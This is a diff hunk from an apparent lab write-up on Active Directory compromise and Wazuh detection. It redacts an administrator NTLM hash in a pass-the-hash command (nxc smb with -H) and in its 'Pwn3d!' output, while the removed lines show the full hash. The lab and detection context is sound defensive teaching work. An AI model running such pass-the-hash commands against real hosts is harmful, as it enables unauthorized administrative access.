@@ -95,14 +95,14 @@ Using the Administrator NTLM hash recovered from the LSASS dump:
 ```bash
 nxc smb 192.168.90.121 \
   -u administrator \
-  -H bf27edd1b8509ea3e5a081fe7b90564d
+  -H bf27edd1…[REDACTED-NTLM]
 ```
 
 Output:
 
 ```
 SMB  192.168.90.121  445  WINDOWS-AD-DC
-     [+] lab.local\administrator:bf27edd1b8509ea3e5a081fe7b90564d (Pwn3d!)
+     [+] lab.local\administrator:bf27edd1…[REDACTED-NTLM] (Pwn3d!)
 ```
 
 ## Wazuh Detection
